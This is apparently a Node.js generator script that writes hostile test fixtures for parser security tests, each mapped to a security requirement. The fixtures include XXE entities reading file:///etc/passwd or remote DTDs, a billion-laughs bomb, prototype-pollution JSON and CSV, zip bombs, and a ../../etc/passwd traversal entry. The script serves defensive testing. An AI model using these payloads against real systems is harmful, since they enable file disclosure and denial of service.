import { mkdir, writeFile } from 'node:fs/promises';
import { resolve, join } from 'node:path';
import { fileURLToPath, URL } from 'node:url';
import { TextEncoder } from 'node:util';
import { zipSync } from 'fflate';

const GENERATOR = 'scripts/hostile/package-a-generate-hostiles.mjs';
const FIXED_TIME = new Date('1980-01-01T00:00:00.000Z');
const utf8 = new TextEncoder();

function zip(entries) {
  const archiveEntries = Object.create(null);
  for (const [name, content] of entries) archiveEntries[name] = [content, { mtime: FIXED_TIME }];
  return zipSync(archiveEntries, { level: 9, mtime: FIXED_TIME });
}

function makeOverlapZip() {
  const bytes = zip([
    ['first.txt', utf8.encode('first payload')],
    ['second.txt', utf8.encode('second payload')],
  ]);
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const eocd = findSignature(view, 0x06054b50, bytes.length - 22, 0);
  const count = view.getUint16(eocd + 10, true);
  const directoryStart = view.getUint32(eocd + 16, true);
  let cursor = directoryStart;
  for (let index = 0; index < count; index += 1) {
    if (index === 1) {
      view.setUint32(cursor + 42, 0, true);
      return bytes;
    }
    cursor += 46 + view.getUint16(cursor + 28, true) + view.getUint16(cursor + 30, true) + view.getUint16(cursor + 32, true);
  }
  throw new Error('second central-directory record not found');
}

function makeZip64CountLie() {
  const regular = zip([['one.txt', utf8.encode('one')]]);
  const view = new DataView(regular.buffer, regular.byteOffset, regular.byteLength);
  const eocd = findSignature(view, 0x06054b50, regular.length - 22, 0);
  const directorySize = view.getUint32(eocd + 12, true);
  const directoryStart = view.getUint32(eocd + 16, true);
  const zip64Offset = directoryStart + directorySize;
  const zip64 = new Uint8Array(76);
  const wide = new DataView(zip64.buffer);
  wide.setUint32(0, 0x06064b50, true);
  wide.setBigUint64(4, 44n, true);
  wide.setUint16(12, 45, true);
  wide.setUint16(14, 45, true);
  wide.setBigUint64(24, 1_000_000n, true);
  wide.setBigUint64(32, 1_000_000n, true);
  wide.setBigUint64(40, BigInt(directorySize), true);
  wide.setBigUint64(48, BigInt(directoryStart), true);
  wide.setUint32(56, 0x07064b50, true);
  wide.setUint32(60, 0, true);
  wide.setBigUint64(64, BigInt(zip64Offset), true);
  wide.setUint32(72, 1, true);
  const ordinaryEocd = regular.slice(eocd);
  const ordinaryView = new DataView(ordinaryEocd.buffer, ordinaryEocd.byteOffset, ordinaryEocd.byteLength);
  ordinaryView.setUint16(8, 0xffff, true);
  ordinaryView.setUint16(10, 0xffff, true);
  ordinaryView.setUint32(12, 0xffffffff, true);
  ordinaryView.setUint32(16, 0xffffffff, true);
  return concat([regular.subarray(0, eocd), zip64, ordinaryEocd]);
}

function makeZip64SizeLie() {
  const bytes = zip([['size-lie.bin', utf8.encode('small payload')]]);
  const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
  const eocd = findSignature(view, 0x06054b50, bytes.length - 22, 0);
  const central = view.getUint32(eocd + 16, true);
  view.setUint32(central + 20, 0xffffffff, true);
  view.setUint32(central + 24, 0xffffffff, true);
  return bytes;
}

function findSignature(view, signature, start, end) {
  for (let offset = start; offset >= end; offset -= 1) {
    if (view.getUint32(offset, true) === signature) return offset;
  }
  throw new Error(`ZIP signature ${signature.toString(16)} not found`);
}

function concat(parts) {
  const size = parts.reduce((sum, part) => sum + part.length, 0);
  const result = new Uint8Array(size);
  let offset = 0;
  for (const part of parts) {
    result.set(part, offset);
    offset += part.length;
  }
  return result;
}

const entityBomb = '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lolz>&lol5;</lolz>';
const xmlFixtures = [
  ['xxe-file.xml', '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>', ['SEC-4', 'SEC-10'], { api: 'scanXml', rootPresent: true, text: '&e;', warnings: ['DTD_IGNORED', 'UNKNOWN_ENTITY'] }],
  ['xxe-url.xml', '<!DOCTYPE x [<!ENTITY e SYSTEM "https://example.invalid/secret">]><x>&e;</x>', ['SEC-4', 'SEC-10'], { api: 'scanXml', rootPresent: true, text: '&e;', warnings: ['DTD_IGNORED', 'UNKNOWN_ENTITY'] }],
  ['xxe-parameter.xml', '<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://example.invalid/evil.dtd">%remote;]><x>local</x>', ['SEC-4', 'SEC-10'], { api: 'scanXml', rootPresent: true, text: 'local', warnings: ['DTD_IGNORED'] }],
  ['billion-laughs.xml', entityBomb, ['SEC-5'], { api: 'scanXml', rootPresent: true, text: '&lol5;', warnings: ['DTD_IGNORED', 'UNKNOWN_ENTITY'] }],
  ['quadratic-entities.xml', `<!DOCTYPE x [<!ENTITY a "${'q'.repeat(2048)}">]><x>${'&a;'.repeat(1000)}</x>`, ['SEC-5', 'SEC-7'], { api: 'scanXml', rootPresent: true, text: '&a;'.repeat(1000), warnings: ['DTD_IGNORED', 'UNKNOWN_ENTITY'] }],
  ['deep-10000.xml', `${'<x>'.repeat(10_000)}deep${'</x>'.repeat(10_000)}`, ['SEC-8'], { api: 'parseXml', rootPresent: true, warnings: ['TRUNCATED'], maxDepth: 256 }],
  ['xml-proto-attributes.xml', '<root __proto__="plain" constructor="plain" prototype="plain"><item __proto__="also plain"/></root>', ['SEC-6'], { api: 'scanXml', rootPresent: true, attributesAreStrings: true }],
  ['xml-pi-network.xml', '<?xml-stylesheet href="https://example.invalid/remote.xsl"?><root>local</root>', ['SEC-4', 'SEC-10'], { api: 'scanXml', rootPresent: true, text: 'local', warnings: [] }],
];

const jsonFixtures = [
  ['json-proto.json', '{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}},"prototype":"plain"}', ['SEC-6']],
  ['json-deep-10000.json', `${'['.repeat(10_000)}0${']'.repeat(10_000)}`, ['SEC-8']],
];

const csvFixtures = [
  ['csv-proto-header.csv', '__proto__,constructor,prototype\nplain,plain,plain\n', ['SEC-6']],
  ['csv-unterminated-quote.csv', 'name,value\n"unterminated,field\nnext,row\n', ['SEC-8']],
];

const simpleFixtures = [
  ['html-deep-10000.html', `${'<div>'.repeat(10_000)}deep${'</div>'.repeat(10_000)}`, ['SEC-8']],
  ['markdown-deep-10000.md', `${'> '.repeat(10_000)}deep\n`, ['SEC-8']],
  ['regex-near-miss.txt', `${'a'.repeat(20_000)}!`, ['SEC-7']],
  ['invalid-utf8.txt', new Uint8Array([0x66, 0x80, 0xc0, 0xaf, 0x67]), ['SEC-7']],
  ['wrong-executable.pdf', new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]), ['SEC-10']],
  ['html-remote-image.html', '<html><body><img src="https://example.invalid/pixel.png" alt="remote"/></body></html>', ['SEC-10']],
];

let quineLayer = zip([['payload.txt', utf8.encode('finite recursive-container probe')]]);
for (let depth = 0; depth < 8; depth += 1) quineLayer = zip([['loop.zip', quineLayer]]);

const zipFixtures = [
  ['zip-high-ratio.zip', zip([['repeat.bin', utf8.encode('A'.repeat(1_048_577))]]), ['SEC-1'], { api: 'openZip/read', outcome: 'throws', errorCode: 'LIMIT_EXCEEDED' }],
  ['zip-nested-high-ratio.zip', zip([['inner.zip', zip([['repeat.bin', utf8.encode('A'.repeat(1_048_577))]])]]), ['SEC-1'], { api: 'openZip/read', outcome: 'entry-bytes', entryName: 'inner.zip', prefixBytes: [0x50, 0x4b] }],
  ['zip-many-entries.zip', zip(Array.from({ length: 10_001 }, (_, index) => [`entry-${index}.txt`, utf8.encode('x')])), ['SEC-2'], { api: 'openZip', outcome: 'limited', entries: 0, warningCodes: ['TRUNCATED'] }],
  ['zip-quine-chain.zip', quineLayer, ['SEC-8', 'SEC-9'], { api: 'openZip/read', outcome: 'finite-nested-zip-chain', levels: 8, leafName: 'payload.txt' }],
  ['zip-path-traversal.zip', zip([['../../etc/passwd', utf8.encode('display path only')]]), ['SEC-3'], { api: 'openZip', outcome: 'display-name', names: ['etc/passwd'] }],
  ['zip-overlap.zip', makeOverlapZip(), ['SEC-1', 'SEC-9'], { api: 'openZip', outcome: 'overlap', unreadable: [false, true], warningCodes: ['UNREADABLE_PART'] }],
  ['zip64-size-lie.zip', makeZip64SizeLie(), ['SEC-1'], { api: 'openZip', outcome: 'throws', errorCode: 'CORRUPT_FILE' }],
  ['zip64-count-lie.zip', makeZip64CountLie(), ['SEC-2'], { api: 'openZip', outcome: 'limited', entries: 0, warningCodes: ['TRUNCATED'] }],
  ['zip-truncated-central.zip', zip([['one.txt', utf8.encode('one')]]).subarray(0, -7), ['SEC-1'], { api: 'openZip', outcome: 'throws', errorCode: 'CORRUPT_FILE' }],
];

const allFixtures = [
  ...xmlFixtures.map(([name, content, requirements, parserObservation]) => ({ category: 'xml', name, content: utf8.encode(content), requirements, parserObservation })),
  ...jsonFixtures.map(([name, content, requirements]) => ({ category: 'json', name, content: utf8.encode(content), requirements })),
  ...csvFixtures.map(([name, content, requirements]) => ({ category: 'csv', name, content: utf8.encode(content), requirements })),
  ...simpleFixtures.map(([name, content, requirements]) => ({ category: 'misc', name, content: typeof content === 'string' ? utf8.encode(content) : content, requirements })),
  ...zipFixtures.map(([name, content, requirements, parserObservation]) => ({ category: 'zip', name, content, requirements, parserObservation })),
];

function manifestEntry(fixture) {
  const entry = {
    file: `package-a/${fixture.category}/${fixture.name}`,
    requirements: fixture.requirements,
    maxMs: 2_000,
    maxHeapMB: 256,
    extraction: 'blocked: extract() is not present in foundation 10ae498',
  };
  if (fixture.parserObservation) entry.parserObservation = fixture.parserObservation;
  return entry;
}

export async function generateHostiles(workspaceRoot = fileURLToPath(new URL('../../', import.meta.url))) {
  const root = resolve(workspaceRoot);
  const outputDirectory = join(root, 'hostile', 'package-a');
  const manifestPath = join(root, 'scripts', 'hostile', 'package-a-manifest-delta.json');
  await mkdir(outputDirectory, { recursive: true });
  const manifestEntries = [];
  for (const fixture of allFixtures) {
    const directory = join(outputDirectory, fixture.category);
    await mkdir(directory, { recursive: true });
    const outputPath = join(directory, fixture.name);
    await writeFile(outputPath, fixture.content);
    const requirements = fixture.requirements.join(', ');
    const license = [
      'SPDX-License-Identifier: CC0-1.0',
      `Source: generated by ${GENERATOR}`,
      `Notes: synthetic hostile fixture; generator output is deterministic.`,
      `Requirements: ${requirements}`,
      '',
    ].join('\n');
    await writeFile(`${outputPath}.license`, license, 'utf8');
    manifestEntries.push(manifestEntry(fixture));
  }
  await mkdir(join(root, 'scripts', 'hostile'), { recursive: true });
  await writeFile(
    manifestPath,
    `${JSON.stringify({ schemaVersion: 1, baseCommit: '10ae4985a425842f965bccbb9c86a7e6018c5412', status: 'partial-extract-missing', entries: manifestEntries }, null, 2)}\n`,
    'utf8',
  );
  return { assetCount: allFixtures.length, outputDirectory, manifestPath };
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const rootFlag = process.argv.indexOf('--root');
  const root = rootFlag >= 0 ? process.argv[rootFlag + 1] : fileURLToPath(new URL('../../', import.meta.url));
  const result = await generateHostiles(root);
  process.stdout.write(`Generated ${result.assetCount} hostile fixtures under ${result.outputDirectory}\n`);
}
